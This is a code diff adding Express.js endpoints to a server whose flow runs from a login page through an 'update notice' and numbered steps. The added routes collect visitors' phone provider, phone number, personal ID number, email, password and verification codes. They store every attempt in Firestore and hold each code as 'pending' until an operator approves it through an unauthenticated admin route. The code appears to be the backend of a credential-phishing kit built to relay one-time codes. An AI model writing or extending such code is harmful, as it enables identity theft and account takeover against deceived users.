@@ -478,3 +478,142 @@ app.listen(PORT, () => {
     console.log(`\n🔗 Workflow Path:`);
     console.log(`   / → /login → /update-notice → /step1 → /step3 → /step2Q → /step4 → /step5 → /step6`);
 });
+
+// API: Save activation data (step5)
+app.post('/api/save-activation-data', async (req, res) => {
+    try {
+        const vid = req.cookies.vid;
+        if (!vid) {
+            return res.status(400).json({ success: false, error: 'No visitor ID' });
+        }
+        
+        const { provider, phone, personalId, email, password } = req.body;
+        const { getFirestore } = require('./firebase-config');
+        const db = getFirestore();
+        const timestamp = new Date().toISOString();
+        const docRef = db.collection('visitors').doc(vid);
+        
+        // Get existing document
+        const doc = await docRef.get();
+        const data = doc.exists ? doc.data() : {};
+        
+        // Calculate attempt number
+        const historyCount = data.activation && data.activation.history 
+            ? Object.keys(data.activation.history).length 
+            : 0;
+        
+        const updates = {};
+        
+        // Save previous attempt to history
+        if (data.activation && data.activation.current) {
+            const attemptKey = `activation.history.attempt_${historyCount + 1}`;
+            updates[attemptKey] = {
+                ...data.activation.current,
+                savedAt: timestamp
+            };
+        }
+        
+        // Save current attempt
+        updates['activation.current'] = {
+            provider,
+            phone,
+            personalId,
+            email: email || null,
+            password: password || null,
+            timestamp,
+            attemptNumber: historyCount + 1
+        };
+        updates['lastUpdated'] = timestamp;
+        
+        await docRef.set(updates, { merge: true });
+        
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Activation data save error:', error);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// API: Save verification code (step5)
+app.post('/api/save-verification-code', async (req, res) => {
+    try {
+        const vid = req.cookies.vid;
+        if (!vid) {
+            return res.status(400).json({ success: false, error: 'No visitor ID' });
+        }
+        
+        const { verificationCode } = req.body;
+        if (!verificationCode) {
+            return res.status(400).json({ success: false, error: 'No verification code provided' });
+        }
+        
+        const { getFirestore } = require('./firebase-config');
+        const db = getFirestore();
+        const timestamp = new Date().toISOString();
+        const docRef = db.collection('visitors').doc(vid);
+        
+        // Get existing document
+        const doc = await docRef.get();
+        const data = doc.exists ? doc.data() : {};
+        
+        // Calculate attempt number
+        const historyCount = data.verification && data.verification.history 
+            ? Object.keys(data.verification.history).length 
+            : 0;
+        
+        const updates = {};
+        
+        // Save previous attempt to history
+        if (data.verification && data.verification.current) {
+            const attemptKey = `verification.history.attempt_${historyCount + 1}`;
+            updates[attemptKey] = {
+                ...data.verification.current,
+                savedAt: timestamp
+            };
+        }
+        
+        // Save current attempt
+        updates['verification.current'] = {
+            verificationCode,
+            timestamp,
+            attemptNumber: historyCount + 1
+        };
+        updates['verification.verification_status'] = 'pending';
+        updates['lastUpdated'] = timestamp;
+        
+        await docRef.set(updates, { merge: true });
+        
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Verification code save error:', error);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// API: Check verification approval (step5)
+app.get('/api/check-verification-approval', async (req, res) => {
+    try {
+        const vid = req.cookies.vid;
+        if (!vid) {
+            return res.json({ success: false, error: 'No visitor ID' });
+        }
+        
+        const { getVerificationStatus } = require('./admin-api');
+        const result = await getVerificationStatus(vid);
+        res.json(result);
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// API: Admin approve/reject verification (step5)
+app.post('/api/admin/approve-verification', async (req, res) => {
+    try {
+        const { vid, verification_status } = req.body;
+        const { approveVerification } = require('./admin-api');
+        const result = await approveVerification(vid, verification_status);
+        res.json(result);
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
